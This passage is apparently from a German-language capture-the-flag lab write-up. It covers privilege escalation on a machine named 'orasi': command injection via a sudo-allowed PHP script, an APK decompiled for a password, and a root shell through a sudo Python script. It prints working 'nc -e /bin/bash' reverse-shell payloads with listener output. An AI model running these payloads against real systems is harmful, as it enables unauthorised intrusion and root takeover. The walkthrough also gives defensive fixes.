+                  <pre>                     $ <span class="command">nc -e /bin/bash 192.168.2.140 9002</span></pre> <span class="comment"><-- Versuch 3 (nc -e) --></span>
+                  <pre><span class="comment">=</span></pre>
+             </div>
+         </div>
+          <p class="analysis">**Analyse:** Mehrere Versuche, die Sudo-Regel für `/home/kori/jail.php` auszunutzen.
+.
+Es wird angenommen, dass sudo -l für www-data eine Regel wie (kori) NOPASSWD: /bin/php /home/kori/jail.php ergeben hat.
+Das Skript jail.php nimmt offenbar Argumente entgegen und führt sie unsicher aus (z.B. via exec() oder system()).
+Versuch 1: Übergibt einen socat-Befehl, um eine Verbindung herzustellen.
+Versuch 2: Übergibt dash -i, um eine interaktive Dash-Shell zu starten.
+Versuch 3: Übergibt nc -e /bin/bash ..., um eine Reverse Shell zu starten.</p>
+<p class="evaluation">Bewertung: Der dritte Versuch (nc -e /bin/bash ...) scheint erfolgreich zu sein, da im nächsten Schritt eine Verbindung auf Port 9002 empfangen wird. Das PHP-Skript jail.php ist anfällig für Command Injection über seine Argumente, und da es via sudo als kori läuft, werden die Befehle als kori ausgeführt.</p>
+<p class="recommendation">Empfehlung (Pentester): Starten Sie einen Listener auf Port 9002, bevor Sie den nc -e-Payload ausführen.<br>Empfehlung (Admin): Entfernen Sie die unsichere Sudo-Regel. Korrigieren Sie das jail.php-Skript, um Command Injection zu verhindern (validieren/sanitisieren von Argumenten, keine unsicheren Ausführungsfunktionen verwenden).</p>
+<div class="code-block">
+         <div class="terminal">
+              <div class="prompt">┌──(root㉿cyber)-[~]
+
+└─# <span class="command">nc -lvnp 9002</span></div>
+<pre>
+listening on [any] 9002 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.144] 37254</span> <span class="password"><-- Verbindung als kori! --></span>
+<span class="command">id</span>
+<span class="command">uid=1001(kori) gid=1001(kori) groups=1001(kori)</span></pre>
+<pre><span class="comment">=</span></pre>
+</div>
+</div>
+<p class="analysis">Analyse: Der Netcat-Listener auf Port 9002 empfängt die Verbindung, ausgelöst durch den nc -e-Payload im jail.php-Exploit. Der id-Befehl bestätigt, dass die Shell als Benutzer kori (UID 1001) läuft.</p>
+<p class="evaluation">Bewertung: Erfolgreiche Eskalation von www-data zu kori über die unsichere Sudo-Regel und das verwundbare PHP-Skript.</p>
+<p class="recommendation">Empfehlung (Pentester): Stabilisieren Sie die Shell. Führen Sie Enumeration als kori durch.<br>Empfehlung (Admin): Beheben Sie die Sudo-Regel und das jail.php-Skript.</p>
+</section>
+<section id="privilege-escalation-kori">
+         <h2>Privilege Escalation (kori -> irida)</h2>
+         <p class="analysis">**Analyse:** Als Benutzer `kori` wird nach Wegen zur Eskalation zu `irida` gesucht. Dies beinhaltet das Finden und Reverse Engineering einer Android-APK-Datei.</p>
+
+        <div class="code-block">
+             <div class="terminal">
+                  <div class="prompt">┌──(root㉿cyber)-[~]
+
+└─# <span class="command">apt-get install jd-gui</span></div> <span class="comment"><-- Lokale Installation --></span>
+</div>
+</div>
+<p class="analysis">Analyse: Lokale Installation von jd-gui, einem Java-Decompiler, auf der Angreifer-Maschine.</p>
+<p class="evaluation">Bewertung: Vorbereitung für die Analyse einer .jar- oder .apk-Datei.</p>
+<div class="code-block">
+             <div class="terminal">
+                  <div class="prompt">┌──(root㉿cyber)-[~]
+
+└─# <span class="command">wget http://192.168.2.144:9005/irida.apk</span></div> <span class="comment"><-- Woher kommt Port 9005? --></span>
+<pre>
+[...]
+2022-09-12 00:14:35 (288 MB/s) - irida.apk gespeichert [4083889/4083889]</pre>
+</div>
+</div>
+<p class="analysis">Analyse: Eine Android-App-Datei (irida.apk) wird von Port 9005 des Zielsystems heruntergeladen. Der Ursprung dieses Dienstes auf Port 9005 ist im Log nicht ersichtlich (Nmap hat ihn nicht gefunden).</p>
+<p class="evaluation">Bewertung: Das Finden einer APK-Datei, benannt nach dem Benutzer irida, ist ein starker Hinweis. Sie enthält wahrscheinlich Code oder Informationen, die für die Eskalation relevant sind.</p>
+<p class="recommendation">Empfehlung (Pentester): Analysieren Sie die irida.apk-Datei mit Reverse-Engineering-Tools.<br>Empfehlung (Admin): Untersuchen Sie den unbekannten Dienst auf Port 9005 und deaktivieren Sie ihn, wenn er unnötig oder unsicher ist. Speichern Sie keine sensiblen Informationen in APK-Dateien.</p>
+<div class="code-block">
+             <div class="terminal">
+                  <div class="prompt">┌──(root㉿cyber)-[~]
+
+└─# <span class="command">unzip irida.apk -d irida</span></div>
+<div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">jd-gui irida.apk</span></div>
+<div class="prompt">┌──(root㉿cyber)-[/irida]
+└─# <span class="command">apt install dex2jar</span></div> <span class="comment"><-- Lokale Installation --></span>
+<div class="prompt">┌──(root㉿cyber)-[/irida]
+└─# <span class="command">d2j-dex2jar classes.dex</span></div>
+<div class="prompt">┌──(root㉿cyber)-[/irida]
+└─# <span class="command">jd-gui classes-dex2jar.jar</span></div>
+</div>
+</div>
+<p class="analysis">Analyse: Schritte zur Analyse der irida.apk auf der Angreifer-Maschine:
+unzip: Entpackt den Inhalt der APK-Datei.
+jd-gui irida.apk: Erster Versuch, die APK direkt zu dekompilieren (kann manchmal funktionieren).
+apt install dex2jar: Installation von dex2jar.
+d2j-dex2jar classes.dex: Konvertiert die classes.dex-Datei (enthält den Android-Bytecode) aus der entpackten APK in eine .jar-Datei.
+jd-gui classes-dex2jar.jar: Dekompiliert die resultierende .jar-Datei mit jd-gui, um den Java-Quellcode anzuzeigen.</p>
+<p class="evaluation">Bewertung: Standardverfahren zum Reverse Engineering von Android-APKs. Die Analyse des dekompilierten Codes (nicht im Log gezeigt) muss das Passwort ergeben haben.</p>
+<p class="recommendation">Empfehlung (Pentester): Suchen Sie im dekompilierten Code nach hartkodierten Zugangsdaten, API-Schlüsseln, Logikfehlern oder anderen Hinweisen.<br>Empfehlung (Admin): Verwenden Sie Code-Obfuskation (z.B. ProGuard/R8) für Android-Apps und speichern Sie niemals sensible Daten direkt im Code.</p>
+<div class="code-block">
+         <div class="terminal">
+             <div class="prompt">www-data@orasi:~/html$ <span class="command">su irida</span></div> <span class="comment"><-- Prompt passt nicht, sollte kori@orasi sein --></span>
+             <pre>Password: <span class="password">eye.of.the.tiger()</span> <span class="password"><-- Passwort aus APK-Analyse --></span></pre>
+             <div class="prompt">irida@orasi:~$ <span class="comment"># Shell als irida!</span></div>
+         </div>
+     </div>
+      <p class="analysis">**Analyse:** Aus der Shell von `kori` (trotz des `www-data`-Prompts im Log) wird der Befehl `su irida` ausgeführt, um zum Benutzer `irida` zu wechseln. Das Passwort `eye.of.the.tiger()`, das durch die Analyse der `irida.apk` gefunden wurde, wird eingegeben.</p>
+      <p class="evaluation">**Bewertung:** Der Benutzerwechsel ist erfolgreich! Der Angreifer agiert nun als `irida`. Die Eskalation von `kori` zu `irida` ist abgeschlossen.</p>
+      <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `id` und `cat user.txt` aus. Suchen Sie nach Wegen zur Root-Eskalation (`sudo -l` etc.).<br>**Empfehlung (Admin):** Ändern Sie das Passwort von `irida`. Entfernen Sie das Passwort aus der APK.</p>
+
+     <div class="code-block">
+         <div class="terminal">
+              <div class="prompt">irida@orasi:~$ <span class="command">ls</span></div>
+              <pre>irida.apk  user.txt</pre>
+              <div class="prompt">irida@orasi:~$ <span class="command">cat user.txt</span></div>
+              <pre><span class="password">2afb9cbb10c22dc7e154a8c434595948</span></pre> <span class="comment"><-- User Flag --></span>
+              <pre><span class="comment">#</span></pre>
+         </div>
+     </div>
+      <p class="analysis">**Analyse:** Als `irida` wird das Home-Verzeichnis aufgelistet und die Datei `user.txt` ausgelesen.</p>
+      <p class="evaluation">**Bewertung:** Die User-Flag (`2afb9cbb10c22dc7e154a8c434595948`) wurde gefunden.</p>
+      <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich auf die Eskalation zu Root.<br>**Empfehlung (Admin):** Keine.</p>
+ </section>
+
+ <section id="privilege-escalation-irida">
+     <h2>Privilege Escalation (irida -> root)</h2>
+     <p class="analysis">**Analyse:** Als Benutzer `irida` wird der letzte Schritt zur Erlangung von Root-Rechten gesucht. Dies scheint über ein Python-Skript (`/root/oras.py`) zu führen, das via `sudo` ausgeführt werden kann.</p>
+
+    <div class="code-block">
+         <div class="terminal">
+              <pre><span class="command">python3 -c 'print(b"hello".hex())' | sudo python3 /root/oras.py</span> <span class="comment"><-- Testaufruf --></span>
+
+<span class="command">python3 -c "print(b"import('os').system('nc -e /bin/bash 192.168.2.140 9006')".hex())" | sudo python3 /root/oras.py</span> <span class="comment"><-- Exploit-Payload --></span></pre>
+<pre><span class="comment">*</span></pre>
+</div>
+</div>
+<p class="analysis">Analyse: Zwei Befehle werden vorbereitet/gezeigt:
+Ein Testaufruf: Der String "hello" wird hex-kodiert (print(b"hello".hex())) und das Ergebnis über eine Pipe an sudo python3 /root/oras.py übergeben. Dies impliziert, dass sudo -l für irida eine Regel wie (root) NOPASSWD: /usr/bin/python3 /root/oras.py ergeben hat.
+Der Exploit-Payload: Ein Python-Befehl, der eine nc -e /bin/bash Reverse Shell zu 192.168.2.140:9006 startet, wird hex-kodiert (print(b"payload".hex())) und soll dann ebenfalls an sudo python3 /root/oras.py übergeben werden.
+Das Skript /root/oras.py nimmt offenbar hex-kodierte Python-Befehle als Standardeingabe entgegen, dekodiert sie und führt sie mittels python3 (und damit als root wegen sudo) aus.</p>
+<p class="evaluation">Bewertung: Eine klare Schwachstelle: Ein Skript, das via sudo als Root läuft, nimmt Benutzereingaben (wenn auch hex-kodiert) entgegen und führt sie als Code aus. Dies erlaubt beliebige Code-Ausführung als Root.</p>
+<p class="recommendation">Empfehlung (Pentester): Starten Sie einen Listener auf 192.168.2.140:9006. Führen Sie den zweiten Befehl (Exploit-Payload) in der irida-Shell aus.<br>Empfehlung (Admin): Entfernen Sie diese extrem unsichere Sudo-Regel und das Skript /root/oras.py. Führen Sie niemals Skripte über Sudo aus, die unsanitisierte Benutzereingaben als Code interpretieren.</p>
+<div class="code-block">
+         <div class="terminal">
+              <div class="prompt">┌──(root㉿cyber)-[~/irida]
+
+└─# <span class="command">nc -lvnp 9006</span></div>
+<pre>
+listening on [any] 9006 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.144] 54564</span> <span class="password"><-- Root-Shell erhalten! --></span>
+<span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="command">pwd</span>
+/var/www/html
+<span class="command">cd ~</span>
+<span class="command">pwd</span>
+/root
+<span class="command">ls -la</span>
+total 52
+drwx------ 6 root root 4096 Feb 11 2021 .
+drwxr-xr-x 18 root root 4096 Feb 11 2021 ..
+-rw------- 1 root root 4305 Feb 11 2021 .bash_history
+-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc
+drwxr-xr-x 3 root root 4096 Feb 11 2021 .cache
+drwxr-xr-x 2 root root 4096 Feb 11 2021 .cron
+drwx------ 3 root root 4096 Feb 11 2021 .gnupg
+drwxr-xr-x 3 root root 4096 Feb 11 2021 .local
+<span class="command">-rwx------ 1 root root 126 Feb 11 2021 oras.py</span> <span class="comment"><-- Das verwundbare Skript --></span>
+-rw-r--r-- 1 root root 148 Aug 17 2015 .profile
+<span class="command">-rw------- 1 root root 33 Feb 11 2021 root.txt</span>
+-rw-r--r-- 1 root root 180 Feb 11 2021 .wget-hsts
+<span class="command">cat root.txt</span>
+<span class="password">b1c17c79773c831cbb9109802059c6b5</span> <span class="comment"><-- Root Flag --></span></pre>
+</div>
+</div>
+<p class="analysis">Analyse: Der Netcat-Listener auf Port 9006 empfängt die Verbindung, ausgelöst durch den Exploit von /root/oras.py. Der id-Befehl bestätigt Root-Rechte (uid=0). Anschließend wird in das /root-Verzeichnis gewechselt, der Inhalt aufgelistet (wobei oras.py und root.txt sichtbar sind) und die Root-Flag (b1c17c79773c831cbb9109802059c6b5) ausgelesen.</p>
+<p class="evaluation">Bewertung: Root-Zugriff erfolgreich erlangt durch Ausnutzung der unsicheren Sudo-Regel und des oras.py-Skripts.</p>
+<p class="recommendation">Empfehlung (Pentester): Ziel erreicht.<br>Empfehlung (Admin): System vollständig kompromittiert. Incident Response durchführen. Unsichere Sudo-Regel und Skript entfernen.</p>
+<div class="code-block">
+             <div class="terminal">
+                 <pre><span class="command">cat user.txt</span>
+
+<span class="password">2afb9cbb10c22dc7e154a8c434595948</span></pre>
+<pre><span class="comment">*</span></pre>
+</div>
+</div>
+<p class="analysis">Analyse: Die User-Flag wird (erneut?) ausgelesen.</p>
+<p class="evaluation">Bewertung: Bestätigt die User-Flag.</p>
+</section>
+<section id="flags">
+        <div class="flag-container">
+            <h2 class="flag-heading">Flags</h2>
+            <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+             <div class="code-block">
+                <center>
+                    <div class="terminal"> <!-- Struktur laut Template -->
+                       <div class="flag-command">cat /home/irida/user.txt</div> <span class="comment"><-- Pfad korrigiert basierend auf Login --></span>
+                       <div class="flag-value"><span class="password">2afb9cbb10c22dc7e154a8c434595948</span></div>
+                    </div>
+                </center>
+             </div>
+             <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+            <div class="code-block">
+                <center>
+                    <div class="terminal"> <!-- Struktur laut Template -->
+                        <div class="flag-command">cat /root/root.txt</div>
+                        <div class="flag-value"><span class="password">b1c17c79773c831cbb9109802059c6b5</span></div>
+                    </div>
+                 </center>
+            </div>
+            <p class="evaluation">**Bewertung:** Root-Flag.</p>
+        </div>
+    </section>
+ 
+
+<footer class="footer">
+    <p>DarkSpirit - Cyber Security Reports</p>
+    <p>Berichtsdatum: [Datum nicht im Log gefunden]</p> <!-- Kein Datum im Log gefunden -->
+</footer> 
+</body>
+</html>
